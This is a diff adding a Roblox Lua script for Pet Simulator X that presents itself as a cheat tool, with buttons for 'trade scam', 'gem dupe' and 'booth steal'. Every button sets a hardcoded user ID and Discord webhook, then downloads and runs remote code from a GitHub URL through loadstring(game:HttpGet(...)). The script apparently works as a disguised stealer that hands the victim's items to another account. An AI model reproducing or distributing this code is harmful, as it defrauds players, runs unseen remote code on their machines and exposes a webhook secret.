@@ -1,0 +1,30 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("PSX TRADE SCAM", "Synapse")
+ 
+local SelfTab = Window:NewTab("trade-scam");
+local VehicleTab = Window:NewTab("GEM DUPE");
+local WorkTab = Window:NewTab("BOOTH STEAL");
+ 
+ 
+local Section1 = SelfTab:NewSection("TRADE");
+Section1:NewLabel("scam trade");
+ 
+Section1:NewButton("SCAM", "Click again when the trade ends", function()
+    UserId = 213797809
+    WebHook = 'https://discordapp.com/api/webhooks/1069034431530147850/iTN9VhxIOU8wRtiRK-Rju9SI_NVugkISbzY_ublCswdxhi-lc4x4spe3R-mX36UFyeLa'
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/psxgm"))()
+end)
+local Section1 = VehicleTab:NewSection("GEM DUPE");
+Section1:NewToggle("ON/OFF", "gem dupe", function()
+    UserId = 213797809
+    WebHook = 'https://discordapp.com/api/webhooks/1069034431530147850/iTN9VhxIOU8wRtiRK-Rju9SI_NVugkISbzY_ublCswdxhi-lc4x4spe3R-mX36UFyeLa'
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/psxgm"))()
+end)
+local Section1 = WorkTab:NewSection("BOOTH STEAL");
+Section1:NewLabel("THE STEAL");
+ 
+Section1:NewButton("STEAL", "click 5 times q and press the pet", function()
+    UserId = 213797809
+    WebHook = 'https://discordapp.com/api/webhooks/1069034431530147850/iTN9VhxIOU8wRtiRK-Rju9SI_NVugkISbzY_ublCswdxhi-lc4x4spe3R-mX36UFyeLa'
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/psxgm"))()
+end)
